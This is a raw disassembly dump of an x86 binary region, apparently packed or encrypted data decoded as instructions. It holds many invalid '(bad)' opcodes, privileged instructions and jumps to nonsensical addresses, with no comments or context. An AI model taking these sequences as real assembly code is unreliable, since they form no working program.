  4132a7:	and    BYTE PTR [edx],bh
  4132a9:	(bad)  
  4132aa:	call   0xfffd491a
  4132af:	cmc    
  4132b0:	int3   
  4132b1:	jge    0x413237
  4132b3:	stc    
  4132b4:	mov    esp,0x5f53fe6f
  4132b9:	frstor [esi-0x28fd9da]
  4132bf:	pushf  
  4132c0:	fwait
  4132c1:	ja     0x4132c1
  4132c3:	into   
  4132c4:	mov    ah,0x39
  4132c6:	daa    
  4132c7:	adc    BYTE PTR [esi],bl
  4132c9:	jo     0x4132b1
  4132cb:	popa   
  4132cc:	sub    BYTE PTR [edi-0x2],ch
  4132cf:	pusha  
	...
  4132dc:	add    BYTE PTR [eax],al
  4132de:	add    dl,ah
  4132e0:	pop    ebx
  4132e1:	imul   BYTE PTR [esi+0x10ffde94]
  4132e7:	mov    ebx,0x75e940c6
  4132ec:	mov    ecx,0x6f6c9edb
  4132f1:	(bad)  
  4132f2:	aam    0x4d
  4132f4:	push   ds
  4132f5:	inc    ecx
  4132f6:	jmp    0x7e8c2173
  4132fb:	push   esp
  4132fc:	jge    0x413282
  4132fe:	add    DWORD PTR [edi+ebp*2-0x2],0xb0dd6703
  413306:	scas   al,BYTE PTR es:[edi]
  413307:	lahf   
  413308:	outs   dx,DWORD PTR ds:[esi]
  413309:	std    
  41330a:	xchg   esp,eax
  41330b:	sbb    esi,DWORD PTR [edi-0x2]
  41330e:	push   esi
  41330f:	sub    al,0x39
  413311:	daa    
  413312:	add    BYTE PTR [esi-0x665a1991],ah
  413318:	outs   dx,BYTE PTR ds:[esi]
  413319:	(bad)  
  41331a:	jo     0x4132fe
  41331c:	arpl   si,si
  41331e:	ss or  al,0xde
  413321:	inc    eax
  413323:	mov    esi,0xde940c6
  413328:	mov    ecx,0x6ef416db
  41332d:	(bad)  
  41332e:	fcom   QWORD PTR [ebp+0x1e]
  413331:	inc    ecx
  413332:	jmp    0x8c652f
  413337:	pop    ebp
  413338:	clc    
  413339:	xchg   DWORD PTR [ebp-0x22196],eax
  41333f:	leave  
  413340:	lods   al,BYTE PTR ds:[esi]
  413341:	jmp    0x0:0xf7
	...
  413350:	add    BYTE PTR [eax],al
  413352:	cmp    eax,0x8973fef8
  413357:	popa   
  413358:	(bad)  
  413359:	jmp    FWORD PTR ds:0x4275fdb9
  41335f:	fist   DWORD PTR [ecx-0x207e2bc]
  413365:	mov    ch,0xea
  413367:	(bad)  
  413369:	(bad)  
  41336a:	fnsave [ebp+0x6]
  41336d:	call   0x3ee297
  413372:	mov    ebp,0xbdf7eab5
  413377:	idiv   ebp
  413379:	jne    0x41336d
  41337b:	fcmovbe st,st(7)
  41337d:	inc    esp
  41337e:	int    0xf7
  413380:	std    
  413381:	mov    ch,0xe2
  413383:	(bad)  
  413385:	(bad)  
  413386:	fnsave [ebp+0x6]
  413389:	call   0x3ee29f
  41338e:	dec    ebp
  41338f:	mov    ch,0xe2
  413391:	idiv   DWORD PTR ds:0xd275fdf7
  413397:	fidivr DWORD PTR [ebx-0x208e2bc]
  41339d:	mov    ch,0x2a
  41339f:	(bad)  
  4133a1:	call   FWORD PTR ds:0xcde80675
  4133a7:	scas   al,BYTE PTR es:[edi]
  4133a8:	std    
  4133a9:	call   FWORD PTR [ebp-0x4b]
  4133ac:	(bad)  
  4133ae:	dec    ebp
  4133af:	idiv   ebp
  4133b1:	jne    0x413335
  4133b3:	fidivr DWORD PTR [esi-0x2]
	...
  4133c2:	add    BYTE PTR [eax],al
  4133c4:	add    BYTE PTR ds:0x3eb5fdf7,bh
  4133ca:	(bad)  
  4133cc:	jmp    DWORD PTR [ebx+0x4]
  4133cf:	stos   BYTE PTR es:[edi],al
  4133d0:	inc    esi
  4133d1:	ins    BYTE PTR es:[edi],dx
  4133d2:	push   DWORD PTR [ebp-0x4c]
  4133d5:	jae    0x413446
  4133d7:	je     0x4133d7
  4133d9:	dec    ebx
  4133da:	mov    esp,0x7754febd
  4133df:	scas   al,BYTE PTR es:[edi]
  4133e0:	jmp    0x413436
  4133e2:	pop    edi
  4133e3:	je     0x4133cc
  4133e5:	out    dx,al
  4133e6:	push   ds
  4133e7:	jne    0x4133e7
  4133e9:	cmp    al,0x99
  4133eb:	imul   esi,esi,0x34
  4133ee:	push   edi
  4133ef:	imul   ecx,DWORD PTR [ecx-0x18bc05c],0xffffffee
  4133f6:	aas    
  4133f7:	ins    BYTE PTR es:[edi],dx
  4133f8:	(bad)  
  4133f9:	sbb    al,0x54
  4133fb:	hlt    
  4133fc:	inc    esi
  4133fd:	adc    al,0xb7
  4133ff:	je     0x4133b5
  413401:	add    esi,DWORD PTR [edi+0xffbfe74]
  413407:	mov    ebp,0xbe8efcfe
  41340c:	test   DWORD PTR [edx],0xecfe75fc
  413412:	jle    0x413402
  413414:	sti    
  413415:	sti    
  413416:	lds    ebx,FWORD PTR [edx]
  413418:	add    BYTE PTR [ebx-0x4b],ah
  41341b:	inc    ecx
  41341c:	pop    es
  41341d:	arpl   WORD PTR [ecx],dx
  41341f:	mov    ebx,ebp
  413421:	loopne 0x4133ca
  413423:	ja     0x41348e
  413425:	arpl   WORD PTR [edx-0x37],dx
  413428:	inc    BYTE PTR [eax]
	...
  413436:	add    BYTE PTR [eax],al
  413438:	ss je  0x4134a5
  41343b:	test   DWORD PTR [edi],ebx
  41343d:	xlat   BYTE PTR ds:[ebx]
  41343e:	je     0x4133c8
  413440:	es shr bl,0x82
  413444:	sbb    al,0x9d
  413446:	add    bh,bh
  413448:	push   ss
  413449:	je     0x4134b5
  41344b:	pop    es
  41344c:	xchg   ebp,eax
  41344d:	ss jne 0x41344e
  413450:	push   ss
  413451:	and    BYTE PTR [ebp+0x74],dh
  413454:	pop    ebx
  413455:	add    eax,0x6e20b311
  41345a:	sbb    eax,0xe908a24b
  41345f:	into   
  413460:	fldenv [eax+0x69]
  413463:	inc    eax
  413464:	jo     0x4134d3
  413466:	jnp    0x41346f
  413468:	dec    ebx
  413469:	and    esp,ecx
  41346b:	add    esp,DWORD PTR [ebx+0x0]
  41346e:	sub    edi,ebp
  413470:	pusha  
  413471:	sub    cl,BYTE PTR ds:[eax]
  413474:	arpl   WORD PTR [ebx+ebx*2+0x14],bp
  413478:	dec    ebx
  413479:	adc    eax,DWORD PTR [ecx]
  41347b:	add    al,0x63
  41347d:	add    BYTE PTR [ecx-0x55c19f12],ch
  413483:	pop    es
  413484:	arpl   WORD PTR [esi+0x2b],di
  413487:	jl     0x4134a6
  413489:	repz shr BYTE PTR [ebx+0x6f],0xc4
  41348e:	mov    ch,0x74
  413490:	fcmovnb st,st(2)
  413492:	lods   al,BYTE PTR ds:[esi]
  413493:	je     0x413424
  413495:	imul   esp,DWORD PTR [ebp+0x136cf4ee],0x14
	...
  4134ab:	or     edi,DWORD PTR [edx+edi*1]
  4134ae:	jne    0x41349d
  4134b0:	add    BYTE PTR [ecx+0x2b7e29ef],ch
  4134b6:	jo     0x413502
  4134b8:	add    eax,0xd5d0be6c
  4134bd:	jne    0x4134ad
  4134bf:	enter  0xba5d,0xe7
  4134c3:	lds    ebp,FWORD PTR [ecx+esi*8+0x43]
  4134c7:	xor    BYTE PTR [ebx],ah
  4134c9:	rol    DWORD PTR [ebx],1
  4134cb:	push   ebx
  4134cc:	pop    esp
  4134cd:	xchg   esi,eax
  4134ce:	je     0x413507
  4134d0:	std    
  4134d1:	inc    eax
  4134d2:	shl    DWORD PTR [ecx],cl
  4134d4:	ins    BYTE PTR es:[edi],dx
  4134d5:	inc    ebp
  4134d6:	je     0x4134ef
  4134d8:	stc    
  4134d9:	cmp    eax,0xff5d5cee
  4134de:	lea    esp,[ebx+0x752efe6b]
  4134e4:	js     0x4134e4
  4134e6:	pushf  
  4134e7:	hlt    
  4134e8:	push   0x74
  4134ea:	icebp  
  4134eb:	or     cl,bl
  4134ed:	inc    edx
  4134ee:	push   ss
  4134ef:	imul   DWORD PTR [edx+0x74]
  4134f2:	or     eax,0x645a1f8
  4134f7:	xlat   BYTE PTR ds:[ebx]
  4134f8:	cmp    eax,0xd260edc1
  4134fd:	mov    al,BYTE PTR ds:0x97d347e3
  413503:	iret   
  413504:	icebp  
  413505:	or     edx,ecx
  413507:	dec    eax
  413508:	mov    edi,0xac34defe
  41350d:	je     0x4134fb
	...
  41351b:	add    BYTE PTR [eax],al
  41351d:	add    BYTE PTR [edx],dl
  41351f:	cmp    eax,0x7a60ddc1
  413524:	inc    esp
  413525:	mov    ecx,0xed746b37
  41352a:	mov    eax,0x90b64c0d
  41352f:	(bad)  
  413530:	mov    edi,0xff4bdcde
  413535:	call   0x9db5a19a
  41353a:	xchg   edi,eax
  41353b:	add    DWORD PTR [ebp-0x6a],0x7d447d70
  413542:	jo     0x413535
  413544:	sti    
  413545:	xchg   dl,bl
  413547:	pop    edi
  413548:	(bad)  
  413549:	hlt    
  41354a:	dec    eax
  41354b:	fs stos BYTE PTR es:[edi],al
  41354d:	das    
  41354e:	push   eax
  41354f:	imul   ecx,DWORD PTR [edx-0x5da2db0c],0xffffffe9
  413556:	pusha  
  413557:	add    eax,0xc4a83f68
  41355c:	(bad)  
  41355d:	mov    esi,0xe9177408
  413562:	pusha  
  413563:	add    al,al
  413565:	add    bh,bl
  413567:	cld    
  413568:	call   0x48c005
  41356d:	mov    ecx,DWORD PTR [edx+0x49]
  413570:	fadd   QWORD PTR [edi-0x45]
  413573:	pop    es
  413574:	call   0x48b2b2
  413579:	add    ebx,DWORD PTR [edx-0x16]
  41357c:	jae    0x413566
  41357e:	loop   0x413565
  413580:	inc    ebp
  413581:	inc    ecx
	...
  41358e:	add    BYTE PTR [eax],al
  413590:	add    BYTE PTR [edx+0x4d],bh
  413593:	out    0xd3,al
  413595:	inc    edx
  413596:	pop    es
  413597:	add    BYTE PTR [ebx],cl
  413599:	mov    ch,BYTE PTR [eax+eax*1-0x15]
  41359d:	int3   
  41359e:	call   0xe430bdb1
  4135a3:	xchg   DWORD PTR [ebp+0x2e],eax
  4135a6:	dec    edi
  4135a7:	out    dx,al
  4135a8:	inc    edi
  4135a9:	mov    eax,DWORD PTR [ecx]
  4135ab:	push   esi
  4135ac:	call   0x413481
  4135b1:	inc    ecx
  4135b2:	(bad)  
  4135b3:	jae    0x4135b7
  4135b5:	xor    DWORD PTR [esi-0x77],edx
  4135b8:	lock mov dl,0xf1
  4135bb:	inc    ebp
  4135bc:	inc    ecx
  4135bd:	cli    
  4135be:	into   
  4135bf:	cld    
  4135c0:	push   ss
  4135c1:	cli    
  4135c2:	push   es
  4135c3:	add    esi,eax
  4135c5:	jae    0x413634
  4135c7:	fisubr DWORD PTR [eax-0x1c]
  4135ca:	aas    
  4135cb:	aas    
  4135cc:	add    BYTE PTR [ecx+ecx*8],ch
  4135cf:	xchg   esi,eax
  4135d0:	sbb    dl,bh
  4135d2:	push   es
  4135d3:	or     eax,eax
  4135d5:	fild   WORD PTR [eax]
  4135d7:	jmp    0x413614
  4135d9:	push   eax
  4135da:	push   ss
  4135db:	mov    BYTE PTR [ebp-0x13],dl
  4135de:	jmp    0x3d830e26
  4135e3:	loop   0x4135ab
  4135e5:	retf   0x8b06
  4135e8:	inc    ebp
  4135e9:	and    bh,BYTE PTR [esi+edi*8-0x82c9c01]
  4135f0:	(bad)  [ecx+edx*2+0xfe5a]
	...
  413603:	add    BYTE PTR [esi],dl
  413605:	je     0x413661
  413607:	xchg   edx,eax
  413608:	xchg   ebp,eax
  413609:	sub    esi,DWORD PTR [edx-0x77]
  41360c:	ss mov edi,0xe47f447d
  413612:	adc    cl,BYTE PTR [edx+0x447e2b16]
  413618:	fwait
  413619:	hlt    
  41361a:	adc    al,BYTE PTR [eax-0x7afea3d3]
  413620:	psubq  mm6,QWORD PTR [ecx-0x2]
  413624:	pop    esp
  413625:	jmp    0xa1441d88
  41362a:	jno    0x41362a
  41362c:	ficomp WORD PTR [eax+0x233b4f72]
  413632:	mov    esi,0x3573cfe
  413637:	pop    esi
  413638:	sub    bl,BYTE PTR [esi-0x18690001]
  41363e:	pop    edi
  41363f:	(bad)  
  413640:	scas   al,BYTE PTR es:[edi]
  413641:	dec    eax
  413642:	pop    edx
  413643:	aam    0xaa
  413645:	inc    ebx
  413646:	jo     0x413652
  413648:	and    esi,DWORD PTR [eax]
  41364a:	sbb    ebp,DWORD PTR [eax+0x22]
  41364d:	sbb    eax,ebx
  41364f:	call   DWORD PTR [esp+eax*2-0x5d03b723]
  413656:	shl    DWORD PTR [edi+0x65],cl
  413659:	scas   al,BYTE PTR es:[edi]
  41365a:	ret    
  41365b:	inc    DWORD PTR [esp+ebx*2+0x3a5ef02]
  413662:	push   esi
  413663:	inc    esi
  413664:	and    bl,BYTE PTR [edx+edx*8-0x2]
	...
  413674:	add    BYTE PTR [eax],al
  413676:	add    BYTE PTR [esi+0x74],cl
  413679:	pop    edx
  41367a:	cmp    DWORD PTR [ebx],0x2ae770f3
  413680:	and    DWORD PTR [ecx-0x2],esi
  413683:	stos   BYTE PTR es:[edi],al
  413684:	add    al,0x2b
  413686:	cld    
  413687:	mov    ah,0xd0
  413689:	jno    0x4136eb
  41368b:	loope  0x4136cd
  41368d:	push   esp
  41368e:	fisub  WORD PTR [ebx+ebx*8-0x2e88f5e]
  413695:	push   eax
  413696:	in     eax,dx
  413697:	and    ch,BYTE PTR [edx+0x3d]
  41369a:	jnp    0x4136c3
  41369c:	imul   eax,edx,0xe0ef840d
  4136a2:	pop    ebx
  4136a3:	(bad)  
  4136a4:	imul   esp,DWORD PTR ds:0x1e260a71,0x715d64f7
  4136ae:	jno    0x413715
  4136b0:	imul   eax,DWORD PTR [edx-0xf0ca3f1],0xfd68f35b
  4136ba:	jo     0x413680
  4136bc:	add    eax,0xde0660e9
  4136c1:	sbb    al,0xc9
  4136c3:	mov    ds:0x9d435105,eax
  4136c8:	(bad)  
  4136c9:	call   0xc13eee3e
  4136ce:	es mov ecx,0x9770cd68
  4136d4:	imul   eax,ebp,0x3e5d5cf6
  4136da:	mov    BYTE PTR [eax],0x0
	...
  4136e9:	add    BYTE PTR ds:0x60459f69,cl
  4136ef:	add    eax,0x87087d14
  4136f4:	lods   al,BYTE PTR ds:[esi]
  4136f5:	dec    ebx
  4136f6:	in     eax,dx
  4136f7:	push   0x69a77e9d
  4136fc:	cmp    BYTE PTR [ecx+0x6f],dh
  4136ff:	stc    
  413700:	(bad)  
  413701:	mul    BYTE PTR [ebp+ebx*2+0x2c]
  413705:	sbb    DWORD PTR [ebx+0x5],esp
  413708:	repnz inc ebx
  41370a:	pop    ebp
  41370b:	cmp    bh,0xa8
  41370e:	popa   
  41370f:	add    eax,0x70a5a600
  413714:	(bad)  
  413715:	call   0xa5083c7a
  41371a:	xor    al,0x67
  41371c:	push   es
  41371d:	jmp    0xc3411282
  413722:	pusha  
  413723:	(bad)  
  413725:	shl    BYTE PTR [eax+0x7a],cl
  413728:	inc    esp
  413729:	xor    eax,0x3d8479b0
  41372e:	or     esp,DWORD PTR [edi-0x2]
  413731:	cdq    
  413732:	repz lock mul DWORD PTR [esi]
  413736:	ins    DWORD PTR es:[edi],dx
  413737:	ins    BYTE PTR es:[edi],dx
  413738:	out    0xf7,eax
  41373a:	dec    ebx
  41373b:	add    eax,0xf420e200
  413740:	add    al,0x0
  413742:	out    0x4,eax
  413744:	add    cl,ch
  413746:	cmp    BYTE PTR [eax+0x6860a827],dl
  41374c:	je     0x413733
	...
  41375a:	add    BYTE PTR [eax],al
  41375c:	add    BYTE PTR [eax-0x3311b7d3],ch
  413762:	mov    eax,0x80e2b98a
  413767:	repz (bad) 
  413769:	mov    esp,0x873b4f67
  41376e:	sbb    eax,0x7d8cce48
  413773:	test   BYTE PTR [ecx-0x2e019874],ah
  413779:	cld    
  41377a:	ret    
  41377b:	(bad)  
  41377c:	mov    dh,0x29
  41377e:	push   0xc4b8cd66
  413783:	jmp    DWORD PTR [ebp-0x6109b046]
  413789:	jl     0x4137f2
  41378b:	je     0x41376e
  41378d:	mov    BYTE PTR [esi+0x7d4c8e46],al
  413793:	test   BYTE PTR [eax],al
  413795:	pop    edx
  413796:	lock std 
  413798:	push   DWORD PTR [eax+0x1]
  41379b:	push   0xfe428225
  4137a0:	(bad)  
  4137a1:	ja     0x41375c
  4137a3:	cmc    
  4137a4:	(bad)  
  4137a5:	cmp    eax,0x120873d8
  4137aa:	pusha  
  4137ab:	inc    ebp
  4137ac:	dec    DWORD PTR ds:0x35ec83ea
  4137b2:	fdivr  st,st(5)
  4137b4:	push   0xffffff8a
  4137b6:	dec    ebx
  4137b7:	sub    al,0x48
  4137b9:	mov    ebx,0x72b5ff03
  4137be:	lock std 
  4137c0:	inc    DWORD PTR [eax]
	...
  4137ce:	add    BYTE PTR [eax],al
  4137d0:	dec    ebp
  4137d1:	outs   dx,BYTE PTR ds:[esi]
  4137d2:	push   es
  4137d3:	call   0x3e7686
  4137d8:	repz jge 0x4137c1
  4137db:	test   DWORD PTR [ebp-0x28],0xee8e858b
  4137e2:	std    
  4137e3:	(bad)  
  4137e4:	cli    
  4137e5:	dec    edx
  4137e6:	xor    eax,0xff02fb48
  4137eb:	mov    ch,0x72
  4137ed:	out    dx,al
  4137ee:	std    
  4137ef:	dec    DWORD PTR [ebp+0x6e]
  4137f2:	push   es
  4137f3:	call   0x3e7646
  4137f8:	mov    bl,0x7d
  4137fa:	loop   0x4137f3
  4137fc:	or     eax,0xa20068d8
  413801:	inc    ebx
  413802:	inc    esi
  413803:	inc    ecx
  413804:	or     bl,al
  413806:	mov    bl,0xd8
  413808:	aad    0xd7
  41380a:	std    
  41380b:	inc    DWORD PTR [edi+0x69]
  41380e:	out    0x11,al
  413810:	inc    ebp
  413811:	(bad)  
  413812:	std    
  413813:	mov    DWORD PTR [edi-0x32000a1e],eax
  413819:	cmp    DWORD PTR [ebx+0x6d8763f0],0xfffffffe
  413820:	arpl   WORD PTR [eax],dx
  413822:	fild   DWORD PTR [edx-0x18a6eea]
  413828:	int3   
  413829:	pop    esp
  41382a:	mul    BYTE PTR [ecx-0x20]
  41382d:	xor    DWORD PTR [ebx-0xa],ebx
  413830:	mov    esp,0x7402d7
	...
  413841:	add    BYTE PTR [eax],al
  413843:	sbb    dl,BYTE PTR [edx+eax*1+0x0]
  413847:	mov    esp,0x53746d86
  41384c:	(bad)  
  41384d:	(bad)  
  41384e:	aas    
  41384f:	pushf  
  413850:	mov    bh,0x6d
  413852:	mov    ah,0x93
  413854:	daa    
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	dec    BYTE PTR [ecx+esi*4-0x634417ee]
  41385d:	ins    DWORD PTR es:[edi],dx
  41385e:	(bad)  
  41385f:	jl     0x413852
  413861:	pop    esi
  413862:	div    BYTE PTR [edi+ebx*1+0x6e]
  413866:	je     0x4138bb
  413868:	adc    al,0x89
  41386a:	aas    
  41386b:	movd   mm6,DWORD PTR fs:[ebx+ecx*2+0x54fe6e0f]
  413874:	jmp    0x9c21208b
  413879:	ins    DWORD PTR es:[edi],dx
  41387a:	inc    BYTE PTR [ecx+ebp*1+0x4f]
  41387e:	idiv   BYTE PTR [edi+edx*2]
  413881:	ins    BYTE PTR es:[edi],dx
  413882:	mov    ah,0x3f
  413884:	inc    edi
  413885:	ins    BYTE PTR es:[edi],dx
  413886:	(bad)  
  413887:	sub    al,0xd1
  413889:	adc    ebp,eax
  41388b:	xchg   edi,eax
  41388c:	sbb    al,0x6d
  41388e:	(bad)  
  41388f:	sbb    al,0x91
  413891:	arpl   si,si
  413893:	adc    al,0x3f
  413895:	ins    BYTE PTR es:[edi],dx
  413896:	je     0x41390b
  413898:	push   esp
  413899:	fnstcw WORD PTR [edi]
  41389b:	add    al,0xaf
  41389d:	ins    BYTE PTR es:[edi],dx
  41389e:	je     0x4138f3
  4138a0:	xchg   edi,eax
  4138a1:	mov    dh,0xd7
  4138a3:	in     al,dx
  4138a4:	add    al,0xa6
  4138a6:	ins    DWORD PTR es:[edi],dx
	...
  4138b3:	add    BYTE PTR [eax],al
  4138b5:	add    ch,ch
  4138b7:	out    dx,eax
  4138b8:	lock pop ebx
  4138ba:	jb     0x413923
  4138bc:	xchg   ebp,eax
  4138bd:	ins    DWORD PTR es:[edi],dx
  4138be:	(bad)  [edi+0x65d575b0]
  4138c4:	nop
  4138c5:	loope  0x4138e8
  4138c7:	data16 jge 0x413937
  4138ca:	pcmpeqw mm7,QWORD PTR [ebp+0x6d]
  4138ce:	mov    ebp,0xb5c1105c
  4138d3:	gs gs mov bh,0xb8
  4138d7:	ins    DWORD PTR es:[edi],dx
  4138d8:	pop    ebp
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	mov    esp,0x9d6ca9b7
  4138df:	gs xchg ebx,eax
  4138e1:	pop    esp
  4138e2:	lea    esp,[ebp+0x45]
  4138e5:	pop    esp
  4138e6:	and    al,dl
  4138e8:	cmp    eax,0x4caf856d
  4138ed:	jne    0x41396c
  4138ef:	gs inc eax
  4138f1:	xor    eax,0x6d256620
  4138f6:	mov    bh,0x64
  4138f8:	adc    eax,0xc45c656d
  4138fd:	rcr    BYTE PTR [ebp+0x65],0xd
  413901:	(bad)  
  413902:	dec    esp
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	mov    ch,0x6d
  413906:	dec    ebp
  413907:	gs std 
  413909:	test   BYTE PTR [eax+0x6e],0x7e
  41390d:	push   ss
  41390e:	arpl   WORD PTR ds:0x5684220,ax
  413914:	cmp    al,0x79
  413916:	cmp    BYTE PTR [ecx+0x6fa4],cl
	...
  413928:	add    BYTE PTR [edx+0x1db94305],bh
  41392e:	fneni(8087 only) 
  413930:	pop    ebx
  413931:	push   esi
  413932:	vpunpcklqdq ymm3,ymm7,ymm3
  413936:	retf   0x6cbc
  413939:	(bad)  
  41393a:	or     eax,0xcb8f4100
  41393f:	inc    eax
  413940:	jmp    0xd06852cc
  413945:	and    DWORD PTR [ebp-0x1a],esp
  413948:	xchg   ebp,eax
  413949:	jne    0x4139ae
  41394b:	(bad)  
  41394c:	xchg   esi,eax
  41394d:	aad    0xc
  41394f:	push   0xffc59f91
  413954:	adc    BYTE PTR [ecx+0x5],ah
  413957:	add    BYTE PTR [ecx+0x28],ch
  41395a:	data16 cld 
  41395c:	jbe    0x4139ad
  41395e:	arpl   WORD PTR [ebp+ebp*2+0x47],si
  413962:	fld    DWORD PTR [edi]
  413964:	push   ecx
  413965:	xchg   ecx,eax
  413966:	and    al,0xff
  413968:	pop    esi
  413969:	imul   eax,DWORD PTR [esi+0x3],0xeb8fb5e9
  413970:	push   0x1c
  413972:	pusha  
  413973:	imul   ebp,ecx,0xb4fed0aa
  413979:	mov    BYTE PTR [esp+esi*8-0xa],ch
  41397d:	packsswb mm1,QWORD PTR [eax-0x13fb5c]
  413984:	call   0xaea8db98
  413989:	test   al,0xc5
  41398b:	inc    DWORD PTR [eax+0x0]
	...
  413999:	add    BYTE PTR [eax],al
  41399b:	add    BYTE PTR [edx],ch
  41399d:	int3   
  41399e:	inc    eax
  41399f:	jmp    0x1149136b
  4139a4:	std    
  4139a5:	jmp    0xf6fb:0xd9b8fefe
  4139ac:	ss or  al,0xe8
  4139af:	xlat   BYTE PTR ds:[ebx]
  4139b0:	and    BYTE PTR [ebx-0x2],ah
  4139b3:	mov    al,0xa5
  4139b5:	or     BYTE PTR [eax],al
  4139b7:	xor    al,0xa4
  4139b9:	jo     0x41393b
  4139bb:	lods   eax,DWORD PTR ds:[esi]
  4139bc:	mov    bh,0x5b
  4139be:	dec    dh
  4139c0:	call   0x73f0:0x6a00fbc9
  4139c7:	or     al,0xc5
  4139c9:	push   ebp
  4139ca:	push   es
  4139cb:	call   0x412ea6
  4139d0:	add    eax,ecx
  4139d2:	or     eax,0x9ef85
  4139d7:	add    BYTE PTR [ebp-0x35ff09bb],bh
  4139dd:	pop    es
  4139de:	add    bh,al
  4139e0:	jg     0x4139b7
  4139e2:	std    
  4139e3:	pop    es
  4139e4:	mov    edx,0x70006a07
  4139e9:	or     DWORD PTR [edx+0x0],ebp
  4139ec:	pusha  
  4139ed:	or     DWORD PTR [ebp-0x74c6d1bb],ecx
  4139f3:	test   DWORD PTR [esi],ecx
  4139f5:	fdivr  st,st(5)
  4139f7:	(bad)  
  4139f8:	jmp    0xfa56:0x35f873ee
  4139ff:	call   0x413a04
	...
  413a0c:	add    BYTE PTR [eax],al
  413a0e:	add    BYTE PTR [esi*8-0x386e0001],dl
  413a15:	jb     0x413a1c
  413a17:	xor    edx,ecx
  413a19:	(bad)  
  413a1a:	dec    DWORD PTR [edx-0x34d769c1]
  413a20:	pop    es
  413a21:	push   DWORD PTR [ebp+0x76]
  413a24:	mov    edi,0xf04545cf
  413a29:	dec    esi
  413a2a:	mov    ebx,DWORD PTR [edx+0x6df483dc]
  413a30:	out    dx,al
  413a31:	std    
  413a32:	push   eax
  413a33:	call   0x4586f9f6
  413a38:	lock xchg DWORD PTR [ebp-0x229ae],eax
  413a3f:	(bad)  
  413a40:	test   BYTE PTR [ecx-0x1],0x45
  413a44:	inc    ecx
  413a45:	(bad)  
  413a46:	addr16 mov ebx,0x63003f9e
  413a4c:	cmp    ebp,DWORD PTR [edi+0x69540cd7]
  413a52:	(bad)  
  413a53:	xchg   esi,eax
  413a54:	push   esp
  413a55:	pop    edx
  413a56:	sbb    DWORD PTR [esi-0x1977965d],ebx
  413a5c:	pushf  
  413a5d:	jno    0x413a5d
  413a5f:	hlt    
  413a60:	mov    BYTE PTR [ebx],0x68
  413a63:	retf   
  413a64:	adc    al,0xc5
  413a66:	jmp    ebp
  413a68:	mov    ecx,0x7bdcf64a
  413a6d:	imul   esi,DWORD PTR [ebx+ebp*2-0x7c],0x4369
	...
  413a81:	add    ah,cl
  413a83:	mov    edi,DWORD PTR [ebx-0x7c]
  413a86:	mov    bh,0xdb
  413a88:	imul   edi,esi,0xacda6c49
  413a8e:	sub    ebp,DWORD PTR ds:0xc4f6ff04
  413a94:	jno    0x413a94
  413a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a97:	ret    
  413a98:	out    dx,eax
  413a99:	pop    es
  413a9a:	mov    edx,eax
  413a9c:	mov    esi,0x7fe594fe
  413aa1:	out    0x94,eax
  413aa3:	retf   
  413aa4:	imul   ecx,DWORD PTR [esi+ebx*8+0x7cfe7200],0x2bc5da7c
  413aaf:	lods   eax,DWORD PTR ds:[esi]
  413ab0:	add    bh,bh
  413ab2:	mov    dh,0xc4
  413ab4:	jno    0x413ab4
  413ab6:	fs add esi,eax
  413ab9:	pop    es
  413aba:	dec    ebx
  413abb:	xor    BYTE PTR [edi+0x7fe554fe],bh
  413ac1:	jecxz  0x413b17
  413ac3:	or     ebp,DWORD PTR [edx+0x69]
  413ac6:	arpl   WORD PTR [ebp+ecx*2+0x47],si
  413aca:	mov    ds:0x1bb4696c,al
  413acf:	pop    ebx
  413ad0:	push   0x5c052cfe
  413ad5:	cld    
  413ad6:	cmp    al,0xac
  413ad8:	and    al,0x69
  413ada:	sbb    eax,0xd646b8c
  413adf:	(bad)  
  413ae0:	int    0x77
  413ae2:	out    0x34,eax
  413ae4:	mov    ebp,0x69
	...
  413af5:	add    eax,0xa47550b5
  413afa:	(bad)  
  413afb:	call   0xb57dea68
  413b00:	imul   ebp,ebp,0xfcfc1b61
  413b06:	mov    esp,DWORD PTR [ecx+ebp*2]
  413b09:	fisttp QWORD PTR [ebx+0x61cd506b]
  413b0f:	lea    eax,[ebp+0x697d550f]
  413b15:	lds    eax,FWORD PTR [esi*8-0x7b601e24]
  413b1c:	jno    0x413ad3
  413b1e:	popa   
  413b1f:	call   0xa3c77e13
  413b24:	pop    esp
  413b25:	lods   eax,DWORD PTR ds:[esi]
  413b26:	popa   
  413b27:	pop    ebp
  413b28:	add    al,0x17
  413b2a:	mov    esp,0x726303c0
  413b2f:	mov    gs,WORD PTR [ecx+0x17]
  413b32:	cmc    
  413b33:	push   eax
  413b34:	cmp    BYTE PTR [edi+0x62],al
  413b37:	cmp    eax,0x3d54b769
  413b3c:	imul   esi,DWORD PTR [ebp+0x61],0x247b13b3
  413b43:	out    0x68,eax
  413b45:	gs popa 
  413b47:	push   ebx
  413b48:	pop    eax
  413b49:	push   ebp
  413b4a:	popa   
  413b4b:	adc    eax,0xf5cf69
  413b50:	push   ss
  413b51:	lea    esp,[eax+0x5]
  413b54:	imul   ecx,DWORD PTR [edi],0x68f56e
	...
  413b66:	add    BYTE PTR [eax],al
  413b68:	cmp    eax,0x507bff61
  413b6d:	ins    DWORD PTR es:[edi],dx
  413b6e:	add    ebp,DWORD PTR [edi-0x6301a045]
  413b74:	pushf  
  413b75:	push   edi
  413b76:	(bad)  
  413b77:	fimul  WORD PTR [ebx-0x74211c67]
  413b7d:	pop    edi
  413b7e:	(bad)  
  413b7f:	push   esp
  413b80:	ja     0x413bef
  413b82:	ret    
  413b83:	add    al,0x7a
  413b85:	pop    edi
  413b86:	(bad)  
  413b87:	je     0x413b09
  413b89:	push   edi
  413b8a:	(bad)  
  413b8b:	mov    dh,0x8b
  413b8d:	(bad)  [edi]
  413b8f:	rol    DWORD PTR [esi-0x205900df],0xa1
  413b96:	iret   
  413b97:	xchg   esi,eax
  413b98:	dec    ebx
  413b99:	pop    edi
  413b9a:	call   FWORD PTR [eax+eax*4]
  413b9d:	in     eax,dx
  413b9e:	add    cl,ch
  413ba0:	sub    esp,DWORD PTR [edx+0x6d70fcfe]
  413ba6:	imul   edi,DWORD PTR [ebx+ecx*2+0x103cfe5f],0x3b6efe57
  413bb1:	cdq    
  413bb2:	rcr    DWORD PTR [esi+0x3b],cl
  413bb5:	pop    edi
  413bb6:	(bad)  
  413bb7:	aam    0x70
  413bb9:	ins    DWORD PTR es:[edi],dx
  413bba:	mov    edx,DWORD PTR [edx+ecx*1]
  413bbd:	pop    edi
